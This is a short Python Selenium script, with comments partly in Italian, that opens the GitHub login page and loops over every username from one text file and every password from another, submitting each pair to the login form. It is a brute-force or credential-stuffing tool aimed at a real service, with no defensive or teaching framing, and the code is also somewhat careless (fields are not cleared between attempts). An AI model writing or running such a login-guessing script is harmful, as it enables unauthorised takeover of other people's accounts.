from selenium import webdriver
from selenium.webdriver.common.by import By
from random import randint
from time import sleep

# importing the webdriver from the selenium 
from selenium import webdriver
#path 
path='C:\\Users\\sumit\\.wdm\\drivers\\chromedriver\\win32\\102.0.5005.61\\chromedriver.exe' 
# we use chrome as a webdriver 
driver = webdriver.Chrome(path)
# URL 
url = "https://github.com/login"
# Opening the URL
driver.get(url)
#your username and password to login
with open('username.txt', 'r') as file1:
    # Leggi tutte le parole nel file e mettile in una lista
    users = file1.read().split()
#your username and password to login into GitHub account
with open('password.txt', 'r') as file2:
    #Leggi tutte le parole nel file e mettile in una lista
    passw = file2.read().split()
for username in users:
    # finding username input field by find_element by id and pass username
    driver.find_element("id","login_field").send_keys("\x01"+username)
    # finding password input field by find_element by id and pass password
    for chiavi in passw:
        driver.find_element("id","password").send_keys(chiavi)
        # finding click button by find_element by name and click to login
        driver.find_element("name","commit").click()
        sleep(5)


sleep(100)
driver.close()
